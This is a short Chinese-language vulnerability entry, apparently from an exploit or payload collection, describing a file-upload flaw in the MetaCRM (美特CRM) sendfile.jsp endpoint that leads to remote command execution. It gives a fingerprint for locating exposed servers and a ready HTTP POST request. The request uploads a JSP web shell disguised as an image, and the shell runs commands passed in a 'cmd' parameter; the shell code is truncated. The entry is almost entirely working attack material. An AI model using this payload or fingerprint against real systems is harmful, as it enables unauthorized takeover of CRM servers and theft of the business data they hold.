# 美特CRMsendfile.jsp存在文件上传致RCE漏洞

- **系统**：美特　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/common/scripts/basic.js"`

**请求体 / payload**
```
**POST** /business/common/importdata/sendfile.jsp **HTTP/1.1**
**Host**:
**User-Agent**: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
**Content-Type**: **multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj**
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b…（脚本共 787 字，完整版见原文）
```
- **预期**：200　|　—